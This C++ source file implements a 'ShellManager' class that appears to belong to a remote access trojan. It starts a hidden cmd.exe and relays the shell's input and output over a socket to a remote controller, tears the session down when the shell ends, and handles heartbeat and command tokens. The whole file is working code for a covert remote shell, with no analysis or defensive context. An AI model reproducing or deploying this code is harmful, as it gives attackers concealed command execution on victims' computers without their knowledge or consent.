// ShellManager.cpp: implementation of the CShellManager class.
//
//////////////////////////////////////////////////////////////////////
#include "stdafx.h"
#include "ShellManager.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CShellManager::CShellManager(ISocketBase* pClient) :CManager(pClient)
{
	m_buser = FALSE;
	SECURITY_ATTRIBUTES  sa = { 0 };
	STARTUPINFOA          si = { 0 };
	PROCESS_INFORMATION  pi = { 0 };
	char  strShellPath[MAX_PATH] = { 0 };

	m_hReadPipeHandle = NULL;
	m_hWritePipeHandle = NULL;
	m_hReadPipeShell = NULL;
	m_hWritePipeShell = NULL;
	sa.nLength = sizeof(sa);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;


	if (!CreatePipe(&m_hReadPipeHandle, &m_hWritePipeShell, &sa, 0))
	{
		if (m_hReadPipeHandle != NULL)	CloseHandle(m_hReadPipeHandle);
		if (m_hWritePipeShell != NULL)	CloseHandle(m_hWritePipeShell);
		return;
	}

	if (!CreatePipe(&m_hReadPipeShell, &m_hWritePipeHandle, &sa, 0))
	{
		if (m_hWritePipeHandle != NULL)	CloseHandle(m_hWritePipeHandle);
		if (m_hReadPipeShell != NULL)	CloseHandle(m_hReadPipeShell);
		return;
	}

	memset((void*)&si, 0, sizeof(si));
	memset((void*)&pi, 0, sizeof(pi));

	GetStartupInfoA(&si);
	si.cb = sizeof(STARTUPINFO);
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.hStdInput = m_hReadPipeShell;
	si.hStdOutput = si.hStdError = m_hWritePipeShell;

	GetSystemDirectoryA(strShellPath, MAX_PATH);
	strcat_s(strShellPath, "\\cmd.exe");

	if (!CreateProcessA(strShellPath, NULL, NULL, NULL, TRUE,
		NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi))
	{
		CloseHandle(m_hReadPipeHandle);
		CloseHandle(m_hWritePipeHandle);
		CloseHandle(m_hReadPipeShell);
		CloseHandle(m_hWritePipeShell);
		return;
	}
	m_hProcessHandle = pi.hProcess;
	m_hThreadHandle = pi.hThread;
	nBufLen = 0;
	BYTE	bToken = TOKEN_SHELL_START;
	Send((LPBYTE)&bToken, 1);
	WaitForDialogOpen();
	m_hThreadRead = (HANDLE)_beginthreadex(NULL, 0, ReadPipeThread, (LPVOID)this, 0, NULL);
	m_hThreadMonitor = (HANDLE)_beginthreadex(NULL, 0,MonitorThread, (LPVOID)this, 0, NULL);
	m_buser = TRUE;
}

CShellManager::~CShellManager()
{
	if (!m_buser) return;
	TerminateThread(m_hThreadRead, 0);
	TerminateProcess(m_hProcessHandle, 0);
	TerminateThread(m_hThreadHandle, 0);
	WaitForSingleObject(m_hThreadMonitor, 2000);
	TerminateThread(m_hThreadMonitor, 0);

	if (m_hReadPipeHandle != NULL)
		DisconnectNamedPipe(m_hReadPipeHandle);
	if (m_hWritePipeHandle != NULL)
		DisconnectNamedPipe(m_hWritePipeHandle);
	if (m_hReadPipeShell != NULL)
		DisconnectNamedPipe(m_hReadPipeShell);
	if (m_hWritePipeShell != NULL)
		DisconnectNamedPipe(m_hWritePipeShell);

	CloseHandle(m_hReadPipeHandle);
	CloseHandle(m_hWritePipeHandle);
	CloseHandle(m_hReadPipeShell);
	CloseHandle(m_hWritePipeShell);

	CloseHandle(m_hProcessHandle);
	CloseHandle(m_hThreadHandle);
	CloseHandle(m_hThreadMonitor);
	CloseHandle(m_hThreadRead);
}

void CShellManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	if (lpBuffer[0] == TOKEN_HEARTBEAT) return;
	if (nSize == 1 && lpBuffer[0] == COMMAND_NEXT)
	{
		NotifyDialogIsOpen();
		return;
	}


	unsigned long ByteWrite;
	WriteFile(
		m_hWritePipeHandle,
		lpBuffer,
		nSize,
		&ByteWrite,
		NULL
	);


}

unsigned  CShellManager::ReadPipeThread(LPVOID lparam)
{
	unsigned long   BytesRead = 0;
	char	ReadBuff[1024];
	DWORD	TotalBytesAvail;
	CShellManager* pThis = (CShellManager*)lparam;
	while (1)
	{
		Sleep(10);
		while (PeekNamedPipe(pThis->m_hReadPipeHandle, ReadBuff, sizeof(ReadBuff), &BytesRead, &TotalBytesAvail, NULL))
		{
			if (BytesRead <= 0)
				break;
			memset(ReadBuff, 0, sizeof(ReadBuff));
			LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, TotalBytesAvail);
			ReadFile(pThis->m_hReadPipeHandle, lpBuffer, TotalBytesAvail, &BytesRead, NULL);
			// 发送数据
			pThis->Send(lpBuffer, BytesRead);
			LocalFree(lpBuffer);

		/*	if (BytesRead <= 0)
				break;
			memset(ReadBuff, 0, sizeof(ReadBuff));
			LPBYTE lpBuffer = new BYTE[TotalBytesAvail];
			RtlZeroMemory(lpBuffer, TotalBytesAvail);
			ReadFile(pThis->m_hReadPipeHandle, lpBuffer, TotalBytesAvail, &BytesRead, NULL);*/

			//WCHAR* lpwszBuffer = (WCHAR*)malloc(BytesRead * sizeof(WCHAR));

			//MultiByteToWideChar(
			//	CP_ACP,
			//	NULL,
			//	(LPCSTR)lpBuffer,
			//	-1,
			//	lpwszBuffer,
			//	BytesRead
			//);

			// 发送数据
			/*if ((pThis->nBufLen + 1)> (int)BytesRead|| (pThis->nBufLen + 1) == (int)BytesRead) continue;
			pThis->Send((LPBYTE)lpBuffer+ pThis->nBufLen-1, BytesRead- pThis->nBufLen+1);

			SAFE_DELETE_AR(lpBuffer);*/

		//	free(lpwszBuffer);
		}
	}
	return 0;
}

unsigned CShellManager::MonitorThread(LPVOID lparam)
{
	CShellManager* pThis = (CShellManager*)lparam;
	HANDLE hThread[2];
	hThread[0] = pThis->m_hProcessHandle;
	hThread[1] = pThis->m_hThreadRead;
	WaitForMultipleObjects(2, hThread, FALSE, INFINITE);
	TerminateThread(pThis->m_hThreadRead, 0);
	TerminateProcess(pThis->m_hProcessHandle, 1);
	pThis->m_pClient->Disconnect();
	return 0;
}
